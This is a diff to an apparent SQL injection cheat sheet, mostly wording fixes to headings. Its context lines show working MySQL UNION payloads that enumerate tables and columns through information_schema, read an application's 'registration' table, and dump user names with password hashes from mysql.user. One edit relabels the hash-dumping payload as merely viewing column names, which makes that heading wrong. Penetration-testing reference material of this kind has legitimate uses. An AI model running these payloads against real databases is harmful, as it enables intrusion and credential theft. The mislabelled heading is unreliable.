@@ -68,13 +68,13 @@ Find all databases:
 
 ### Current Database
 
-Find tables with in current database:
+Find tables within current database:
 
 ```bash
 'union select table_name from information_schema.tables where table_schema = database() -- -
 ```
 
-View Columns inside a table (registration) within current database:
+View columns inside a table (registration) within current database:
 
 ```bash
 `' union select column_name from information_schema.columns where table_name='registration' and table_schema=database() -- -`
@@ -88,7 +88,7 @@ View contents of registration table from current database:
 
 ### Other Databases
 
-View tables in another database:
+View tables in another databases:
 
 ```bash
 'union select table_name from information_schema.tables where table_schema = 'mysql' -- -
@@ -100,7 +100,7 @@ View column names of a table in another database:
 'union select column_name from information_schema.columns where table_name='user' and table_schema='mysql' -- -
 ```
 
-View contents of columns of a table in another database:
+View column names of a table in another database:
 
 ```bash
 'union select concat(User, ':', authentication_string) from mysql.user -- -
